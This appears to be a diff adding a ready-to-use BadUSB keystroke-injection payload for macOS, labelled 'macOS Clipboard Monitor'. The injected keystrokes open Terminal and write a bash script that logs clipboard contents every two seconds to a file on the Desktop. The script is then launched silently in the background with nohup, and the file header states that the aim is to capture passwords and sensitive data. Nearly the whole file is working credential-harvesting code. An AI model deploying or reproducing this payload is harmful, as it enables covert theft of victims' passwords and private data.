@@ -1,0 +1,36 @@
+REM Title: macOS Clipboard Monitor
+REM Author: BadUSB Library
+REM Description: Monitors clipboard for passwords and sensitive data
+REM Target: macOS 10.15+
+REM Category: Authentication
+REM Type: Directly Ready
+
+REM Open Terminal
+DELAY 2000
+GUI SPACE
+DELAY 1000
+STRING Terminal
+ENTER
+DELAY 3000
+
+REM Create clipboard monitor
+STRING cat > /tmp/clipboard_monitor.sh << 'EOF'
+#!/bin/bash
+while true; do
+    current_clipboard=$(pbpaste 2>/dev/null)
+    if [ ! -z "$current_clipboard" ]; then
+        echo "$(date): $current_clipboard" >> ~/Desktop/clipboard_log.txt
+    fi
+    sleep 2
+done
+EOF
+ENTER
+DELAY 2000
+
+STRING chmod +x /tmp/clipboard_monitor.sh
+ENTER
+DELAY 1000
+
+STRING nohup /tmp/clipboard_monitor.sh > /dev/null 2>&1 &
+ENTER
+DELAY 2000
